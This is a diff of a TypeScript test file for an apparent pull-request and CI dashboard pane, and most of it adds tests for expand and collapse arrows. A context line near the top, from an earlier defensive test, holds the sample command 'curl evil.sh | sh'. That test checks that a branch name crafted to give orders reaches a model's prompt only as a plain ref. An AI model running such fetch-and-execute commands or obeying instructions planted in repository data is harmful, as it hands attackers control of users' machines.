@@ -274,6 +274,84 @@ test('a branch named to give orders reaches the prompt as a plain ref', async ($
   expect(submitted[0]).not.toContain('curl evil.sh | sh')
 })
 
+const NESTED = {
+  live: false,
+  prs: [
+    row('1', { changes: ['Ada Lovelace commented'], checks: [{ name: 'build', state: 'passed', required: true, link: null }] }),
+    row('5', { repo: 'api' }),
+    row('2', { ci: 'CI failed', waiting: 'a CI fix' }),
+  ],
+  errors: [],
+}
+
+test('the arrow at the end of a line unfolds all under it and folds it back; the one beside refresh does the whole pane', async ($, on) => {
+  mock.clock(on)
+  const calls: string[][] = []
+  on('env.get', ($, e) => ({ value: e.name === 'HOME' ? '/home/someone' : undefined }))
+  on('process.run', ($, e) => {
+    calls.push([...e.argv])
+
+    return ran(0, e.argv[2] === 'status' ? JSON.stringify(NESTED) : '')
+  })
+  on('ui.render', () => Fragment({}))
+  on('ui.open', () => ({ value: { isPlaced: true as const } }))
+
+  await $.command.run(RUN)
+  const pane = await mountPane($, 'terminal')
+
+  await pane.press({ key: 'all-waiting' })
+
+  expect(await pane.find({ key: 'waiting', text: '▾ Waiting for others (2)' })).toBeDefined()
+  expect(await pane.find({ key: 'repo-shop', text: '▾ shop (1)' })).toBeDefined()
+  expect(await pane.find({ key: 'repo-api', text: '▾ api (1)' })).toBeDefined()
+  expect(await pane.find({ key: 'ci-shop-1', text: '▾ CI 1/1' })).toBeDefined()
+  expect(await pane.find({ text: /Ada Lovelace commented/ })).toBeDefined()
+  // Opened, a PR's changes are read, as when it is opened by hand.
+  expect(calls.filter(argv => argv[2] === 'read').map(argv => argv[3])).toEqual([NESTED.prs[0]?.url])
+  expect(await pane.find({ key: 'all-waiting', text: '▴ all' })).toBeDefined()
+  expect(await pane.find({ key: 'attention', text: '▸ Needs your attention (1)' })).toBeDefined()
+
+  // Folding back leaves the section open, its repos folded.
+  await pane.press({ key: 'all-waiting' })
+
+  expect(await pane.find({ key: 'repo-shop', text: '▸ shop (1)' })).toBeDefined()
+  expect(await pane.find({ key: 'pr-toggle-shop-1' })).toBeUndefined()
+  expect(await pane.find({ key: 'all-waiting', text: '▾ all' })).toBeDefined()
+
+  // A repo's arrow goes no further than its PRs; a PR's, its CI.
+  await pane.press({ key: 'all-repo-shop' })
+
+  expect(await pane.find({ key: 'ci-shop-1', text: '▾ CI 1/1' })).toBeDefined()
+
+  await pane.press({ key: 'all-pr-shop-1' })
+
+  expect(await pane.find({ key: 'pr-toggle-shop-1', text: '▾' })).toBeDefined()
+  expect(await pane.find({ key: 'ci-shop-1', text: '▸ CI 1/1' })).toBeDefined()
+
+  // One repo open, by hand or not: the section's arrow folds it back at the first press.
+  expect(await pane.find({ key: 'all-waiting', text: '▴ all' })).toBeDefined()
+
+  await pane.press({ key: 'all-waiting' })
+
+  expect(await pane.find({ key: 'repo-shop', text: '▸ shop (1)' })).toBeDefined()
+
+  // The one beside refresh folds everything while a section is open, else unfolds it all.
+  expect(await pane.find({ text: '▴ collapse all' })).toBeDefined()
+
+  await pane.press({ key: 'fold-all' })
+
+  expect(await pane.find({ key: 'attention', text: '▸ Needs your attention (1)' })).toBeDefined()
+  expect(await pane.find({ key: 'waiting', text: '▸ Waiting for others (2)' })).toBeDefined()
+  expect(await pane.find({ text: '▾ expand all' })).toBeDefined()
+
+  await pane.press({ key: 'fold-all' })
+
+  expect(await pane.find({ key: 'attention', text: '▾ Needs your attention (1)' })).toBeDefined()
+  expect(await pane.find({ key: 'pr-toggle-shop-2', text: '▾' })).toBeDefined()
+  expect(await pane.find({ key: 'ci-shop-1', text: '▾ CI 1/1' })).toBeDefined()
+  expect(await pane.find({ text: '▴ collapse all' })).toBeDefined()
+})
+
 const FAILING = {
   live: false,
   prs: [
@@ -749,6 +827,22 @@ test('the pipeline runs the user launched come first, folded with what runs on t
   await pane.press({ key: 'build-step-toggle-70100-1' })
 
   expect(await pane.find({ text: 'warning: too-many-branches' })).toBeUndefined()
+
+  // A repo of runs has no arrow: a run's steps are read only when it is opened. A run read already
+  // folds its jobs and steps from its arrow while one is open, and unfolds them all once none is.
+  expect(await pane.find({ key: 'all-builds-repo-project' })).toBeUndefined()
+  expect(await pane.find({ key: 'all-build-42' })).toBeUndefined()
+  expect(await pane.find({ key: 'all-build-70100', text: '▴ all' })).toBeDefined()
+
+  await pane.press({ key: 'all-build-70100' })
+
+  expect(await pane.find({ key: 'build-job-toggle-70100-1', text: '▸ linting' })).toBeDefined()
+
+  await pane.press({ key: 'all-build-70100' })
+
+  expect(await pane.find({ text: 'warning: too-many-branches' })).toBeDefined()
+
+  await pane.press({ key: 'build-step-toggle-70100-1' })
 
   await pane.press({ key: 'build-rerun-70100' })
 
